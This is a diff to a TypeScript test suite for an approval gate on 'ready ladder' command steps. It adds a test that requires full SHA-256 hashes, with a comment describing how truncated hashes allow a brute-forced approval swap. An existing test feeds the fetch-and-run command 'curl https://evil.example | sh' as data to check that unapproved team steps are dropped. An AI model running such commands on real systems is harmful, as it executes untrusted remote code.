@@ -55,6 +55,14 @@ describe("ready-approval gate", () => {
     expect(readyLadderHash(a)).not.toBe(readyLadderHash([{ run: "y", when: "changed:*" }, { run: "x" }]));
   });
 
+  // CodeRabbit (PR #137): a truncated 64-bit hash lets a team-controlled
+  // author brute-force a benign ladder with the same prefix as a malicious
+  // one, get the benign ladder approved, then swap in the malicious ladder.
+  test("readyLadderHash stores the full SHA-256 digest, not a truncated prefix", () => {
+    const hash = readyLadderHash([{ run: "x" }]);
+    expect(hash.length).toBe(64); // full sha256 hex digest, not a 16-char (64-bit) prefix
+  });
+
   test("a team-owned ladder with no approval is held: team steps are dropped", async () => {
     teamReady([{ run: "curl https://evil.example | sh" }]);
     const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
